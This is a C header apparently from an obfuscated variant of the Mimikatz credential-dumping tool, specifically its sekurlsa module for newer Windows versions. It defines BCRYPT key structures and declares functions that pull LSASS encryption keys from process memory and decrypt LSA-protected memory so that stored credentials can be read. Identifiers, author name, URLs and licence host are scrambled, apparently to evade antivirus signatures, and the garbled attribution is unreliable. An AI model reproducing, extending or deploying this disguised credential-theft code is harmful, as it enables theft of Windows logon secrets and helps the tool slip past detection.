/*	HEstebqu SqUtI `PQu4nQbtjF`
	https://blog.PQu4nQbtjF.com
	isMW9TRNNJyHATgICHfOUxr
	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
*/
#pragma once
#include "../globals_seKuRlSa.h"

// generic in KULL_M_CRYPTO.H
typedef struct _JlzW_BCRYPT_KEY8 {
	ULONG size;
	ULONG tag;	// 'MSSK'
	ULONG type;
	ULONG unk0;
	ULONG unk1;
	ULONG unk2;
	ULONG unk3;
	PVOID unk4;	// before, align in x64
	JlzW_HARD_KEY hardkey;
} JlzW_BCRYPT_KEY8, *PJlzW_BCRYPT_KEY8;

typedef struct _JlzW_BCRYPT_KEY81 {
	ULONG size;
	ULONG tag;	// 'MSSK'
	ULONG type;
	ULONG unk0;
	ULONG unk1;
	ULONG unk2; 
	ULONG unk3;
	ULONG unk4;
	PVOID unk5;	// before, align in x64
	ULONG unk6;
	ULONG unk7;
	ULONG unk8;
	ULONG unk9;
	JlzW_HARD_KEY hardkey;
} JlzW_BCRYPT_KEY81, *PJlzW_BCRYPT_KEY81;

typedef struct _JlzW_BCRYPT_HANDLE_KEY {
	ULONG size;
	ULONG tag;	// 'UUUR'
	PVOID hAlgorithm;
	PJlzW_BCRYPT_KEY key;
	PVOID unk0;
} JlzW_BCRYPT_HANDLE_KEY, *PJlzW_BCRYPT_HANDLE_KEY;

typedef struct _JlzW_BCRYPT_GEN_KEY {
	BCRYPT_ALG_HANDLE hProvider;
	BCRYPT_KEY_HANDLE hKey;
	PBYTE pKey;
	ULONG cbKey;
} JlzW_BCRYPT_GEN_KEY, *PJlzW_BCRYPT_GEN_KEY;

typedef NTSTATUS	(WINAPI * PBCRYPT_ENCRYPT)					(__inout BCRYPT_KEY_HANDLE hKey, __in_bcount_opt(cbInput) PUCHAR pbInput, __in ULONG cbInput, __in_opt VOID *pPaddingInfo, __inout_bcount_opt(cbIV) PUCHAR pbIV, __in ULONG cbIV, __out_bcount_part_opt(cbOutput, *pcbResult) PUCHAR pbOutput, __in ULONG cbOutput, __out ULONG *pcbResult, __in ULONG dwFlags);

NTSTATUS kuhl_m_seKuRlSa_nt6_init();
NTSTATUS kuhl_m_seKuRlSa_nt6_clean();
const PLSA_PROTECT_MEMORY kuhl_m_seKuRlSa_nt6_pLsaProtectMemory, kuhl_m_seKuRlSa_nt6_pLsaUnprotectMemory;

NTSTATUS kuhl_m_seKuRlSa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule);
BOOL kuhl_m_seKuRlSa_nt6_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PKUHL_M_SEKURLSA_OS_CONTEXT pOs, PJlzW_BCRYPT_GEN_KEY pGenKey, LONG armOffset); // TODO:ARM64

NTSTATUS kuhl_m_seKuRlSa_nt6_LsaInitializeProtectedMemory();
VOID kuhl_m_seKuRlSa_nt6_LsaCleanupProtectedMemory();
NTSTATUS kuhl_m_seKuRlSa_nt6_LsaEncryptMemory(PUCHAR pMemory, ULONG cbMemory, BOOL Encrypt);
VOID WINAPI kuhl_m_seKuRlSa_nt6_LsaUnprotectMemory(IN PVOID Buffer, IN ULONG BufferSize);
VOID WINAPI kuhl_m_seKuRlSa_nt6_LsaProtectMemory(IN PVOID Buffer, IN ULONG BufferSize);